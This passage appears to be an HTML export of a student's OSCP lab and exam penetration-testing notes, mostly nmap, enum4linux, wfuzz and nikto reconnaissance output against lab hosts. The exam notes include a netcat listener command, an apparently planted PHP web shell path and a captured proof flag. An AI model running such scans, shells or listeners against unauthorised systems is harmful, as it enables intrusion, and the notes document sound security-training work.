/>S-1-5-21-1086716168-3792659489-4186792627-1026 SUFFERANCE\proxy (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-1027 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1028 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1029 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1030 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1031 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1032 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1033 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1034 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1035 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1036 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1037 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1038 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1039 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1040 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1041 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1042 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1043 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1044 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1045 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1046 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1047 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1048 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1049 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1050 *unknown*\*unknown* (8)<br /><br /> ============================================ <br />|    Getting printer info for 10.11.1.136    |<br /> ============================================ <br />No printers returned.<br /><br /><br />enum4linux complete on Wed May 13 08:10:57 2020</div><div class='page'><h1 class='title level-5'>Pictures</h1><br/><a href=""><img src="images/1057-1.png" alt="images/1057-1.png" /></a></div><div class='page'><h1 class='title level-4'>10.11.1.220 Master</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>master.thinc.local is the domain<br />Windows Server 2008 R2 SP1<br />x64<br /><br /><br /><a href=""><img src="images/1082-1.png" alt="images/1082-1.png" /></a><br /><br /><a href=""><img src="images/1082-2.png" alt="images/1082-2.png" /></a></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.220 &amp;&amp; nmap -sC -sV -Pn 10.11.1.220 &amp;&amp; nmap -p- -Pn 10.11.1.220 &amp;&amp; nmap -Pn -p- -sU 10.11.1.220<br />ttl=127<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 11:27 EDT<br />Nmap scan report for master.thinc.local (10.11.1.220)<br />Host is up (0.060s latency).<br />Not shown: 980 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />53/tcp    open  domain<br />88/tcp    open  kerberos-sec<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />389/tcp   open  ldap<br />445/tcp   open  microsoft-ds<br />464/tcp   open  kpasswd5<br />593/tcp   open  http-rpc-epmap<br />636/tcp   open  ldapssl<br />3268/tcp  open  globalcatLDAP<br />3269/tcp  open  globalcatLDAPssl<br />3389/tcp  open  ms-wbt-server<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br />49165/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 3.84 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 11:27 EDT<br />Nmap scan report for master.thinc.local (10.11.1.220)<br />Host is up (0.085s latency).<br />Not shown: 980 closed ports<br />PORT      STATE SERVICE            VERSION<br />21/tcp    open  ftp                FileZilla ftpd 0.9.34 beta<br />| ftp-syst: <br />|_  SYST: UNIX emulated by FileZilla<br />53/tcp    open  domain             Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)<br />| dns-nsid: <br />|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)<br />88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2013-12-28 07:37:22Z)<br />135/tcp   open  msrpc              Microsoft Windows RPC<br />139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn<br />389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: thinc.local, Site: Default-First-Site-Name)<br />445/tcp   open  microsoft-ds       Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: THINC)<br />464/tcp   open  kpasswd5?<br />593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0<br />636/tcp   open  tcpwrapped<br />3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: thinc.local, Site: Default-First-Site-Name)<br />3269/tcp  open  tcpwrapped<br />3389/tcp  open  ssl/ms-wbt-server?<br />|_ssl-date: 2013-12-28T07:37:28+00:00; -6y142d07h50m57s from scanner time.<br />49152/tcp open  msrpc              Microsoft Windows RPC<br />49153/tcp open  msrpc              Microsoft Windows RPC<br />49154/tcp open  msrpc              Microsoft Windows RPC<br />49155/tcp open  msrpc              Microsoft Windows RPC<br />49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0<br />49158/tcp open  msrpc              Microsoft Windows RPC<br />49165/tcp open  msrpc              Microsoft Windows RPC<br />Service Info: Host: MASTER; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2:sp1<br /><br />Host script results:<br />|_clock-skew: mean: -2333d05h50m57s, deviation: 4h00m00s, median: -2333d07h50m57s<br />| smb-os-discovery: <br />|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)<br />|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1<br />|   Computer name: master<br />|   NetBIOS computer name: MASTER\x00<br />|   Domain name: thinc.local<br />|   Forest name: thinc.local<br />|   FQDN: master.thinc.local<br />|_  System time: 2013-12-27T23:37:18-08:00<br />| smb-security-mode: <br />|   account_used: &lt;blank&gt;<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: required<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled and required<br />| smb2-time: <br />|   date: 2013-12-28T07:37:19<br />|_  start_date: 2014-01-02T01:37:18<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 253.44 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 11:31 EDT<br />Nmap scan report for master.thinc.local (10.11.1.220)<br />Host is up (0.059s latency).<br />Not shown: 65510 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />53/tcp    open  domain<br />88/tcp    open  kerberos-sec<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />389/tcp   open  ldap<br />445/tcp   open  microsoft-ds<br />464/tcp   open  kpasswd5<br />593/tcp   open  http-rpc-epmap<br />636/tcp   open  ldapssl<br />3268/tcp  open  globalcatLDAP<br />3269/tcp  open  globalcatLDAPssl<br />3389/tcp  open  ms-wbt-server<br />5722/tcp  open  msdfsr<br />9389/tcp  open  adws<br />47001/tcp open  winrm<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br />49165/tcp open  unknown<br />49170/tcp open  unknown<br />49178/tcp open  unknown<br /><br /></div><div class='page'><h1 class='title level-5'>Pictures</h1><br/></div><div class='page'><h1 class='title level-4'>10.11.1.226 Joe</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1m1e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.226 &amp;&amp; nmap -sC -sV -Pn 10.11.1.226 &amp;&amp; nmap -p- -Pn 10.11.1.226 &amp;&amp; nmap -Pn -p- -sU 10.11.1.226<br />1<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 12:58 EDT<br />Nmap scan report for 10.11.1.226<br />Host is up (0.081s latency).<br />Not shown: 998 filtered ports<br />PORT     STATE  SERVICE<br />21/tcp   open   ftp<br />3389/tcp closed ms-wbt-server<br /><br />Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 12:58 EDT<br />Nmap scan report for 10.11.1.226<br />Host is up (0.075s latency).<br />Not shown: 998 filtered ports<br />PORT     STATE  SERVICE       VERSION<br />21/tcp   open   ftp           GuildFTPd<br />3389/tcp closed ms-wbt-server<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 30.80 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 12:59 EDT<br />Nmap scan report for 10.11.1.226<br />Host is up (0.069s latency).<br />Not shown: 65533 filtered ports<br />PORT     STATE  SERVICE<br />21/tcp   open   ftp<br />3389/tcp closed ms-wbt-server<br /><br />Nmap done: 1 IP address (1 host up) scanned in 114.19 seconds<br />You requested a scan type which requires root privileges.<br />QUITTING!<br /></div><div class='page'><h1 class='title level-5'>Pictures</h1><br/></div><div class='page'><h1 class='title level-3'>OSCP Exam 1</h1><br/></div><div class='page'><h1 class='title level-4'>192.168.38.43</h1><br/>local.txt<br />18bcfd712d755590e372634a167bdcd7ens160<br /><br />192.168.38.43/october/themes/demo/assets/yee.php5<br />nc -nlvp 3232</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>fyodor<br />Picard<br /><br />/var/www/html/october/modules/backend/database/migrations</div><div class='page'><h1 class='title level-6'>nmap</h1><br/><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-19 19:32 EDT<br />Nmap scan report for 192.168.38.43<br />Host is up (0.014s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-19 19:32 EDT<br />Nmap scan report for 192.168.38.43<br />Host is up (0.012s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 31:0c:c7:08:5b:f4:9e:f6:a1:bc:e8:6d:71:2a:d4:c5 (RSA)<br />|   256 25:4f:f9:a4:8f:5a:01:51:58:43:d2:73:f7:40:ef:0a (ECDSA)<br />|_  256 c2:10:82:c5:6c:86:94:b8:0a:97:6a:19:77:ec:09:28 (ED25519)<br />80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: october<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-19 19:32 EDT<br />Nmap scan report for 192.168.38.43<br />Host is up (0.012s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds<br />You requested a scan type which requires root privileges.<br />QUITTING!<br /></div><div class='page'><h1 class='title level-6'>web</h1><br/><br />PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)</div><div class='page'><h1 class='title level-5'>Pictures</h1><br/><a href=""><img src="images/1104-1.png" alt="images/1104-1.png" /></a><br /><br /><a href=""><img src="images/1104-2.png" alt="images/1104-2.png" /></a><br /><br /><br /><a href=""><img src="images/1104-3.png" alt="images/1104-3.png" /></a><br /><br /><a href=""><img src="images/1104-4.png" alt="images/1104-4.png" /></a><br /><br /><a href=""><img src="images/1104-5.png" alt="images/1104-5.png" /></a><br /><br /><a href=""><img src="images/1104-6.png" alt="images/1104-6.png" /></a><br /><br /><a href=""><img src="images/1104-7.png" alt="images/1104-7.png" /></a><br /><br /><a href=""><img src="images/1104-8.png" alt="images/1104-8.png" /></a><br /><br /><a href=""><img src="images/1104-9.png" alt="images/1104-9.png" /></a><br /><br /><a href=""><img src="images/1104-10.png" alt="images/1104-10.png" /></a><br /><br /><a href=""><img src="images/1104-11.png" alt="images/1104-11.png" /></a><br /><br /></div><div class='page'><h1 class='title level-4'>192.168.38.46 socket</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>Windows 10.0 Build 16299<br />x86<br /><br /><strong>C:\xampp\htdocs\blog\wp-includes\wp-db.php</strong><br /><br /><a href=""><img src="images/1105-1.png" alt="images/1105-1.png" /></a></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 192.168.38.46 &amp;&amp; nmap -sC -sV -Pn 192.168.38.46 &amp;&amp; nmap -p- -Pn 192.168.38.46 &amp;&amp; nmap -Pn -p- -sU 192.168.38.46<br />ttl=127<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-20 01:34 EDT<br />Nmap scan report for 192.168.38.46<br />Host is up (0.011s latency).<br />Not shown: 991 filtered ports<br />PORT     STATE SERVICE<br />80/tcp   open  http<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />443/tcp  open  https<br />445/tcp  open  microsoft-ds<br />3306/tcp open  mysql<br />5800/tcp open  vnc-http<br />5900/tcp open  vnc<br />8081/tcp open  blackice-icecap<br /><br />Nmap done: 1 IP address (1 host up) scanned in 4.65 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-20 01:34 EDT<br />Nmap scan report for 192.168.38.46<br />Host is up (0.017s latency).<br />Not shown: 991 filtered ports<br />PORT     STATE SERVICE          VERSION<br />80/tcp   open  http             Apache httpd 2.4.38 ((Win32) OpenSSL/1.1.1a PHP/7.3.2)<br />|_http-server-header: Apache/2.4.38 (Win32) OpenSSL/1.1.1a PHP/7.3.2<br />| http-title: Welcome to XAMPP<br />|_Requested resource was http://192.168.38.46/dashboard/<br />|_https-redirect: ERROR: Script execution failed (use -d to debug)<br />135/tcp  open  msrpc            Microsoft Windows RPC<br />139/tcp  open  netbios-ssn      Microsoft Windows netbios-ssn<br />443/tcp  open  ssl/http         Apache httpd 2.4.38 ((Win32) OpenSSL/1.1.1a PHP/7.3.2)<br />|_http-server-header: Apache/2.4.38 (Win32) OpenSSL/1.1.1a PHP/7.3.2<br />| http-title: Welcome to XAMPP<br />|_Requested resource was https://192.168.38.46/dashboard/<br />| ssl-cert: Subject: commonName=localhost<br />| Not valid before: 2009-11-10T23:48:47<br />|_Not valid after:  2019-11-08T23:48:47<br />|_ssl-date: TLS randomness does not represent time<br />| tls-alpn: <br />|_  http/1.1<br />445/tcp  open  microsoft-ds?<br />3306/tcp open  mysql            MySQL 5.5.5-10.1.38-MariaDB<br />| mysql-info: <br />|   Protocol: 10<br />|   Version: 5.5.5-10.1.38-MariaDB<br />|   Thread ID: 6<br />|   Capabilities flags: 63487<br />|   Some Capabilities: ODBCClient, Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsLoadDataLocal, LongColumnFlag, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, InteractiveClient, LongPassword, SupportsCompression, DontAllowDatabaseTableColumn, ConnectWithDatabase, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins<br />|   Status: Autocommit<br />|   Salt: +EXk3YF4pYLP0:tZE+Ga<br />|_  Auth Plugin Name: mysql_native_password<br />5800/tcp open  http-proxy       sslstrip<br />|_http-title: TightVNC desktop [socket]<br />5900/tcp open  vnc              VNC (protocol 3.8)<br />|_ssl-cert: ERROR: Script execution failed (use -d to debug)<br />|_ssl-date: ERROR: Script execution failed (use -d to debug)<br />|_sslv2: ERROR: Script execution failed (use -d to debug)<br />|_tls-alpn: ERROR: Script execution failed (use -d to debug)<br />|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)<br />|_vnc-info: ERROR: Script execution failed (use -d to debug)<br />8081/tcp open  blackice-icecap?<br />| fingerprint-strings: <br />|   FourOhFourRequest: <br />|     HTTP/1.1 404 Not Found<br />|     Connection: close<br />|     Content-Type: text/html; charset=ISO-8859-1<br />|     Content-Length: 76<br />|     Date: Wed, 20 May 2020 05:32:37 GMT<br />|     requested URL /nice ports,/Trinity.txt.bak was not found on this server.<br />|   GetRequest: <br />|     HTTP/1.1 404 Not Found<br />|     Connection: close<br />|     Content-Type: text/html; charset=ISO-8859-1<br />|     Content-Length: 49<br />|     Date: Wed, 20 May 2020 05:32:37 GMT<br />|     requested URL / was not found on this server.<br />|   HTTPOptions, RTSPRequest: <br />|     HTTP/1.1 200 OK<br />|     Connection: close<br />|     Content-Length: 0<br />|     Date: Wed, 20 May 2020 05:32:42 GMT<br />|   SIPOptions: <br />|     HTTP/1.1 400 Bad Request<br />|     Connection: close<br />|     Content-Length: 0<br />|_    Date: Wed, 20 May 2020 05:32:37 GMT<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br />SF-Port8081-TCP:V=7.80%I=7%D=5/20%Time=5EC4C17C%P=x86_64-pc-linux-gnu%r(Ge<br />SF:tRequest,C4,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r<br />SF:\nContent-Type:\x20text/html;\x20charset=ISO-8859-1\r\nContent-Length:\<br />SF:x2049\r\nDate:\x20Wed,\x2020\x20May\x202020\x2005:32:37\x20GMT\r\n\r\nT<br />SF:he\x20requested\x20URL\x20/\x20was\x20not\x20found\x20on\x20this\x20ser<br />SF:ver\.&quot;)%r(FourOhFourRequest,DF,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nCon<br />SF:nection:\x20close\r\nContent-Type:\x20text/html;\x20charset=ISO-8859-1\<br />SF:r\nContent-Length:\x2076\r\nDate:\x20Wed,\x2020\x20May\x202020\x2005:32<br />SF::37\x20GMT\r\n\r\nThe\x20requested\x20URL\x20/nice\x20ports,/Trinity\.t<br />SF:xt\.bak\x20was\x20not\x20found\x20on\x20this\x20server\.&quot;)%r(SIPOptions<br />SF:,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nCont<br />SF:ent-Length:\x200\r\nDate:\x20Wed,\x2020\x20May\x202020\x2005:32:37\x20G<br />SF:MT\r\n\r\n&quot;)%r(HTTPOptions,5E,&quot;HTTP/1\.1\x20200\x20OK\r\nConnection:\x2<br />SF:0close\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2020\x20May\x202020\x2<br />SF:005:32:42\x20GMT\r\n\r\n&quot;)%r(RTSPRequest,5E,&quot;HTTP/1\.1\x20200\x20OK\r\n<br />SF:Connection:\x20close\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2020\x20<br />SF:May\x202020\x2005:32:42\x20GMT\r\n\r\n&quot;);<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: -2m15s<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-05-20T05:34:10<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 142.76 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-20 01:37 EDT<br />Nmap scan report for 192.168.38.46<br />Host is up (0.018s latency).<br />Not shown: 65525 filtered ports<br />PORT      STATE SERVICE<br />80/tcp    open  http<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />443/tcp   open  https<br />445/tcp   open  microsoft-ds<br />3306/tcp  open  mysql<br />5800/tcp  open  vnc-http<br />5900/tcp  open  vnc<br />8081/tcp  open  blackice-icecap<br />49666/tcp open  unknown<br /></div><div class='page'><h1 class='title level-6'>web</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Win32) OpenSSL/1.1.1a PHP/7.3.2)<br />|_http-server-header: Apache/2.4.38 (Win32) OpenSSL/1.1.1a PHP/7.3.2<br />|_https-redirect: ERROR: Script execution failed (use -d to debug)<br /><br />PORT    STATE SERVICE  REASON  VERSION<br />443/tcp open  ssl/http syn-ack Apache httpd 2.4.38 ((Win32) OpenSSL/1.1.1a PHP/7.3.2)<br />|_http-server-header: Apache/2.4.38 (Win32) OpenSSL/1.1.1a PHP/7.3.2<br /><br />:443/<br />===================================================================<br />ID           Response   Lines    Word     Chars       Payload                                                                                                                              <br />===================================================================<br /><br />000000011:   403        42 L     97 W     1039 Ch     &quot;.hta&quot;                                                                                                                               <br />000000012:   403        42 L     97 W     1039 Ch     &quot;.htaccess&quot;                                                                                                                          <br />000000013:   403        42 L     97 W     1039 Ch     &quot;.htpasswd&quot;                                                                                                                          <br />000000001:   302        0 L      0 W      0 Ch        &quot;&quot;                                                                                                                                   <br />000000533:   403        42 L     97 W     1039 Ch     &quot;aux&quot;                                                                                                                                <br />000000646:   301        9 L      30 W     339 Ch      &quot;blog&quot;                                                                                                                               <br />000000647:   301        9 L      30 W     339 Ch      &quot;Blog&quot;                                                                                                                               <br />000000820:   403        42 L     98 W     1053 Ch     &quot;cgi-bin/&quot;                                                                                                                           <br />000000942:   403        42 L     97 W     1039 Ch     &quot;com1&quot;                                                                                                                               <br />000000943:   403        42 L     97 W     1039 Ch     &quot;com2&quot;                                                                                                                               <br />000000944:   403        42 L     97 W     1039 Ch     &quot;com3&quot;                                                                                                                               <br />000000988:   403        42 L     97 W     1039 Ch     &quot;con&quot;                                                                                                                                <br />000001156:   301        9 L      30 W     344 Ch      &quot;dashboard&quot;                                                                                                                          <br />000001575:   200        5 L      1546 W   30891 Ch    &quot;favicon.ico&quot;                                                                                                                        <br />000001519:   503        39 L     98 W     1053 Ch     &quot;examples&quot;                                                                                                                           <br />000001998:   301        9 L      30 W     338 Ch      &quot;img&quot;                                                                                                                                <br />000002021:   302        0 L      0 W      0 Ch        &quot;index.php&quot;                                                                                                                          <br />000002284:   403        45 L     113 W    1198 Ch     &quot;licenses&quot;                                                                                                                           <br />000002374:   403        42 L     97 W     1039 Ch     &quot;lpt1&quot;                                                                                                                               <br />000002375:   403        42 L     97 W     1039 Ch     &quot;lpt2&quot;                                                                                                                               <br />000002710:   403        42 L     97 W     1039 Ch     &quot;nul&quot;                                                                                                                                <br />000002954:   403        45 L     113 W    1198 Ch     &quot;phpmyadmin&quot;                                                                                                                         <br />000003124:   403        42 L     97 W     1039 Ch     &quot;prn&quot;                                                                                                                                <br />000003588:   403        45 L     113 W    1198 Ch     &quot;server-status&quot;                                                                                                                      <br />000003586:   403        45 L     113 W    1198 Ch     &quot;server-info&quot;                                                                                                                        <br />000004376:   403        45 L     113 W    1198 Ch     &quot;webalizer&quot;</div><div class='page'><h1 class='title level-6'>mysql</h1><br/><a href=""><img src="images/1111-1.png" alt="images/1111-1.png" /></a></div><div class='page'><h1 class='title level-5'>Pictures</h1><br/><a href=""><img src="images/1107-1.png" alt="images/1107-1.png" /></a><br /><br /><a href=""><img src="images/1107-2.png" alt="images/1107-2.png" /></a><br /><br /></div><div class='page'><h1 class='title level-4'>192.168.38.82</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 192.168.38.82  &amp;&amp; nmap -sC -sV -Pn 192.168.38.82  &amp;&amp; nmap -p- -Pn 192.168.38.82  &amp;&amp; nmap -Pn -p- -sU 192.168.38.82 <br />ttl=63<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-20 09:49 EDT<br />Nmap scan report for 192.168.38.82<br />Host is up (0.011s latency).<br />Not shown: 995 filtered ports<br />PORT     STATE SERVICE<br />22/tcp   open  ssh<br />25/tcp   open  smtp<br />80/tcp   open  http<br />3128/tcp open  squid-http<br />3306/tcp open  mysql<br /><br />Nmap done: 1 IP address (1 host up) scanned in 4.88 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-20 09:49 EDT<br />Nmap scan report for 192.168.38.82<br />Host is up (0.010s latency).<br />Not shown: 995 filtered ports<br />PORT     STATE SERVICE    VERSION<br />22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 ae:d8:cf:52:1e:51:88:d2:20:03:d8:a3:7c:25:77:ee (RSA)<br />|   256 38:dd:7e:1d:91:0e:be:d0:ff:29:f7:4a:85:88:47:32 (ECDSA)<br />|_  256 94:0e:79:35:56:4a:a9:fd:7d:97:69:71:fe:14:75:b4 (ED25519)<br />25/tcp   open  smtp       Postfix smtpd<br />|_smtp-commands: rocinante.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, <br />| ssl-cert: Subject: commonName=rocinante<br />| Subject Alternative Name: DNS:rocinante<br />| Not valid before: 2019-03-08T16:34:50<br />|_Not valid after:  2029-03-05T16:34:50<br />|_ssl-date: TLS randomness does not represent time<br />80/tcp   open  http       Apache httpd 2.4.25 ((Debian))<br />|_http-server-header: Apache/2.4.25 (Debian)<br />|_http-title: Rocinante<br />3128/tcp open  http-proxy Squid http proxy 3.5.23<br />|_http-server-header: squid/3.5.23<br />|_http-title: ERROR: The requested URL could not be retrieved<br />3306/tcp open  mysql      MariaDB (unauthorized)<br />Service Info: Host:  rocinante.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 46.54 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-20 09:50 EDT<br />Nmap scan report for 192.168.38.82<br />Host is up (0.012s latency).<br />Not shown: 65530 filtered ports<br />PORT     STATE SERVICE<br />22/tcp   open  ssh<br />25/tcp   open  smtp<br />80/tcp   open  http<br />3128/tcp open  squid-http<br />3306/tcp open  mysql<br /><br />Nmap done: 1 IP address (1 host up) scanned in 104.45 seconds<br />You requested a scan type which requires root privileges.<br /></div><div class='page'><h1 class='title level-6'>web</h1><br/>PORT     STATE SERVICE    REASON  VERSION<br />3128/tcp open  http-proxy syn-ack Squid http proxy 3.5.23<br />|_http-server-header: squid/3.5.23</div><div class='page'><h1 class='title level-6'>nikto</h1><br/>root@CoolHandKali:/Yeet/Machines/OSCP/Exam/82# nikto -h 192.168.38.82 -useproxy http://192.168.38.82:3128<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.38.82<br />+ Target Hostname:    192.168.38.82<br />+ Target Port:        80<br />+ Proxy:              192.168.38.82:3128<br />+ Start Time:         2020-05-20 11:15:13 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.25 (Debian)<br />+ Retrieved via header: 1.1 rocinante (squid/3.5.23)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ Uncommon header &#39;x-cache&#39; found, with contents: HIT from rocinante<br />+ Uncommon header &#39;x-cache-lookup&#39; found, with contents: HIT from rocinante:3128<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Server banner has changed from &#39;Apache/2.4.25 (Debian)&#39; to &#39;squid/3.5.23&#39; which may suggest a WAF, load balancer or proxy is in place<br />+ Uncommon header &#39;x-squid-error&#39; found, with contents: ERR_INVALID_URL 0<br />+ Server may leak inodes via ETags, header found with file /, inode: 202, size: 58397f477d751, mtime: gzip<br />+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS (May be proxy&#39;s methods, not server&#39;s)<br />+ 7916 requests: 